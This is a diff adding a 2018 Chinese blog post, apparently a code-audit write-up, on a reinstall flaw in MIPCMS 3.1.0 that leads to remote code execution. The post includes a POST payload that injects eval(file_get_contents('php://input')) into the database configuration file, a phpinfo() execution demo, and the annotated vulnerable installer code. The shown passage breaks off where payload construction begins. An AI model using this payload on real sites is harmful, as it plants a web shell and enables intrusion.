@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞) - F0rmat的博客-专注于网络安全、信息安全、内网渗透、红队攻防</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="F0rmat" />
+  <meta name="description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thin" />
+
+  <meta name="keywords" content="渗透测试, 网络安全, F0rmat" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.2" />
+
+
+<link rel="canonical" href="https://xxe.icu/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.5227954e5327390ee2be2e9ddae8b96f1ada64bdf87e87b56b029198ec14dcde.css" integrity="sha256-UieVTlMnOQ7ivi6d2ui5bxraZL34foe1awKRmOwU3N4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)" />
+<meta property="og:description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thin" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxe.icu/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2018-03-26T01:09:26+00:00" />
+<meta property="article:modified_time" content="2018-03-26T01:09:26+00:00" />
+
+<meta itemprop="name" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)">
+<meta itemprop="description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thin"><meta itemprop="datePublished" content="2018-03-26T01:09:26+00:00" />
+<meta itemprop="dateModified" content="2018-03-26T01:09:26+00:00" />
+<meta itemprop="wordCount" content="4182">
+<meta itemprop="keywords" content="MIPCMS,Getshell,每日一洞,代码审计," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)"/>
+<meta name="twitter:description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thin"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">F0rmat's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      F0rmat's Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</h1>
+      
+      <div class="post-meta">
+        <time datetime="2018-03-26" class="post-time">
+          2018-03-26
+        </time>
+        <div class="post-category">
+            <a href="https://xxe.icu/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"> 代码审计 </a>
+            
+          </div>
+        <span class="more-meta"> 约 4182 字 </span>
+          <span class="more-meta"> 预计阅读 9 分钟 </span>
+
+        
+        
+          <span id="busuanzi_container_page_pv">
+            | 阅读 <span id="busuanzi_value_page_pv"></span>
+          </span>
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x01-前言">0x01 前言</a></li>
+        <li><a href="#0x02-环境">0x02 环境</a></li>
+        <li><a href="#0x03-漏洞利用过程">0x03 漏洞利用过程</a></li>
+        <li><a href="#0x04-框架知识补充">0x04 框架知识补充</a></li>
+        <li><a href="#0x05-漏洞代码分析过程">0x05 漏洞代码分析过程</a></li>
+        <li><a href="#0x06-payload构造">0x06 Payload构造</a></li>
+        <li><a href="#0x07-用python编写批量getshell脚本">0x07 用Python编写批量getshell脚本</a></li>
+        <li><a href="#0x08-结束">0x08 结束</a></li>
+        <li><a href="#0x09-参考">0x09 参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h2 id="0x01-前言">0x01 前言</h2>
+<p>今天翻了下CNVD，看到了一个<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">MIPCMS</a>的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。
+看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过<code>install.lock</code>进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。
+想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇<a href="http://getpass.cn/2018/03/06/ZZCMS8.2-any-file-deleted-to-getshell/">ZZCMS 8.2任意文件删除至Getshell</a>的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。</p>
+<h2 id="0x02-环境">0x02 环境</h2>
+<p>程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip
+Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101）
+远程数据库服务器:Windows 10 x64（192.168.1.102）</p>
+<!-- more -->
+<h2 id="0x03-漏洞利用过程">0x03 漏洞利用过程</h2>
+<ol>
+<li>
+<p>我们先正常安装程序
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms1.png" alt=""></p>
+</li>
+<li>
+<p>在远程数据库服务器上面开启远程访问，然后在上面建立一个名为<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>数据库。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms2.png" alt="">
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms3.png" alt=""></p>
+</li>
+<li>
+<p>浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost
+POST:</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
+</code></pre></td></tr></table>
+</div>
+</div><p>记得里面的数据库对应上你远程数据库服务器的信息！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms4.png" alt=""></p>
+<p>可以看到一句把eval函数写到了配置文件里面了</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms6.png" alt="">
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解
+浏览器访问：http://www.getpass.test/system/config/database.php
+POST：<code>phpinfo();</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms5.png" alt=""></p>
+<h2 id="0x04-框架知识补充">0x04 框架知识补充</h2>
+<p>还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003</p>
+<p>首先我们现在thinkPHP的配置文件<code>/system/config/config.php</code>里面修改下面这两个为<code>true</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms10.png" alt=""></p>
+<p>然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个<code>小绿帽</code>，点击就可以看到文件的加载流程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms11.png" alt="">
+这里有很多文件会预加载，我们主要看它的路由文件<code>Route.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms12.png" alt="">
+我们可以看到，这里检查了<code>install.lock</code>文件存不存在，如果不存在就会跳转到安装的界面进行安装。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms13.png" alt=""></p>
+<h2 id="0x05-漏洞代码分析过程">0x05 漏洞代码分析过程</h2>
+<p><code>/app/install/controller/Install.php</code>问题出现在这个文件，它里面的就在index这里检查的<code>install.lock</code>的存在，但是在<code>installPost</code>这个方法里面却没有检查，也没有做关联，在<code>install.html</code>里面直接就跳过了，从而导致了程序重装。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms9.png" alt=""></p>
+<p>下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：</p>
+<ol>
+<li>一个是遍历数据库内容那里，我输出了<code>$matches</code>截图这个内容给你们好理解。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms8.png" alt=""></li>
+<li>再一个是配置文件的替换，读到<code>$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);</code>这句的时候我顺便截图了一个配置的内容。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms7.png" alt=""></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">installPost</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Origin: *&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Credentials: true&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">Request</span><span class="o">::</span><span class="na">instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span><span class="c1">//判断是否有post的数据
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span><span class="p">;</span><span class="c1">//定义数据库类型
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbhost&#39;</span><span class="p">);</span><span class="c1">//接受post过来的dbhost的值，然后赋值到$dbconfig的数组里面，下面以此类推
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbuser&#39;</span><span class="p">);</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbpw&#39;</span><span class="p">);</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostport&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbport&#39;</span><span class="p">);</span>
+                <span class="nv">$dbname</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbname&#39;</span><span class="p">));</span><span class="c1">//这里用了转换小写的函数，所以后面构造poc的时候就不能直接写入一句话木马$_POST了
+</span><span class="c1"></span>                
+                <span class="nv">$username</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.username&#39;</span><span class="p">);</span>
+                <span class="nv">$password</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.password&#39;</span><span class="p">);</span>
+                <span class="nv">$rpassword</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.rpassword&#39;</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span><span class="c1">//判断上面是否有post这个值过来，没有就执行下面的报错，后面的以此类推
+</span><span class="c1"></span>                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入用户名&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入密码&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$rpassword</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入重复密码&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="c1">//下面这句是构造PDO的连接方式，如果有不懂的同学可以去了解下，因为这种方式比老的sql执行方式安全
+</span><span class="c1"></span>                <span class="nv">$dsn</span> <span class="o">=</span> <span class="s2">&#34;mysql:dbname=</span><span class="si">{</span><span class="nv">$dbname</span><span class="si">}</span><span class="s2">;host=</span><span class="si">{</span><span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">;port=</span><span class="si">{</span><span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostport&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">;charset=utf8&#34;</span><span class="p">;</span>
+                <span class="k">try</span> <span class="p">{</span><span class="c1">//如果有学过Python的同学可以晓得try的方式可以自定义报错信息，可以避免泄露其他的敏感数据库信息
+</span><span class="c1"></span>                    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\PDO</span><span class="p">(</span><span class="nv">$dsn</span><span class="p">,</span> <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+                <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">\PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;错误代码:&#39;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
+                <span class="p">}</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;database&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dbname</span><span class="p">;</span><span class="c1">//把上面post过来的数据库名赋值到数组
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">trim</span><span class="p">(</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;dbprefix&#39;</span><span class="p">));</span><span class="c1">//接受post过来的数据前缀，然后用trim去掉两边的空白字符
+</span><span class="c1"></span>                <span class="nv">$tablepre</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s2">&#34;dbprefix&#34;</span><span class="p">);</span><span class="c1">//表名前缀
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">PUBLIC_PATH</span><span class="o">.</span><span class="s1">&#39;package&#39;</span><span class="o">.</span><span class="nx">DS</span><span class="o">.</span><span class="s1">&#39;mipcms_v_3_1_0.sql&#39;</span><span class="p">);</span><span class="c1">//读取数据库文件mipcms_v_3_1_0.sql的内容
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//把刚读到的内容进行替换操作，&#34;\r&#34;是换行符，&#34;\n&#34;是回车符
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//用explode函数以\n区别然后转换为数组形式
+</span><span class="c1"></span>                <span class="nv">$default_tablepre</span> <span class="o">=</span> <span class="s2">&#34;mip_&#34;</span><span class="p">;</span><span class="c1">//定义默认的表名前缀
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34; `</span><span class="si">{</span><span class="nv">$default_tablepre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34; `</span><span class="si">{</span><span class="nv">$tablepre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//把上面传来的表名前缀替换掉默认的表名前缀
+</span><span class="c1"></span>                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sql</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="c1">//这里有个遍历数组，就是把刚才的数组遍历然后一句一句执行
+</span><span class="c1"></span>                    <span class="nv">$item</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
+                    <span class="c1">//这里有个正则匹配，正则总会把对新手弄得云里雾里，其实也不难，这里的意思就是匹配到创建表的语句先执行，然后再执行下面的，要不然会出现错误.
+</span><span class="c1"></span>                    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/CREATE TABLE `([^ ]*)`/&#39;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span><span class="c1">//如果匹配到创建数据表的语句就执行，如果匹配到然后下面的执行不成功就会终止提示安装失败
+</span><span class="c1"></span>                        <span class="k">if</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span>
+
+                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                           <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;安装失败&#39;</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                
+                
+                <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$dbconfig</span><span class="p">)){</span><span class="c1">//判断是否为数组
+</span><span class="c1"></span>                    <span class="nv">$conf</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">PUBLIC_PATH</span><span class="o">.</span><span class="s1">&#39;package&#39;</span><span class="o">.</span><span class="nx">DS</span><span class="o">.</span><span class="s1">&#39;database.php&#39;</span><span class="p">);</span><span class="c1">//读取package文件夹下面的database.php文件
+</span><span class="c1"></span>                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dbconfig</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$conf</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;#</span><span class="si">{</span><span class="nv">$key</span><span class="si">}</span><span class="s2">#&#34;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">);</span><span class="c1">//把刚才读到的内容里面替换掉指定数组键的值，为什么要有#，可以去看刚才文件就可以看到了
+</span><span class="c1"></span>                    <span class="p">}</span>
+                    <span class="nv">$install</span> <span class="o">=</span> <span class="nx">CONF_PATH</span><span class="p">;</span><span class="c1">//把环境常量的conf路径赋值
+</span><span class="c1"></span>                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_writable</span><span class="p">(</span><span class="nv">$install</span><span class="p">)){</span><span class="c1">//判断这个目录是否有写入的权限
+</span><span class="c1"></span>                        <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;路径：&#39;</span><span class="o">.</span><span class="nv">$install</span><span class="o">.</span><span class="s1">&#39;没有写入权限&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">try</span> <span class="p">{</span>
+                        <span class="nv">$fileStatus</span> <span class="o">=</span> <span class="nx">is_file</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">);</span><span class="c1">//判读这个目录下的database.php是否存在
+</span><span class="c1"></span>                        <span class="k">if</span> <span class="p">(</span><span class="nv">$fileStatus</span><span class="p">)</span> <span class="p">{</span>
+                             <span class="nx">unlink</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">);</span><span class="c1">//如果存在就删除这个文件
+</span><span class="c1"></span>                        <span class="p">}</span>
+                        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">CONF_PATH</span><span class="o">.</span> <span class="s1">&#39;/database.php&#39;</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">);</span><span class="c1">//然后重新再写如我们刚才替换的新的数据库文件
+</span><span class="c1"></span>                        <span class="k">return</span> <span class="nx">jsonSuccess</span><span class="p">(</span><span class="s1">&#39;配置文件写入成功&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;database.php文件写入失败，请检查system/config 文件夹是否可写入&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    
+                <span class="p">}</span>
+
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x06-payload构造">0x06 Payload构造</h2>
+<ol>
+<li>从上面的代码分析下来，我们可以晓得，必须要传入的值有
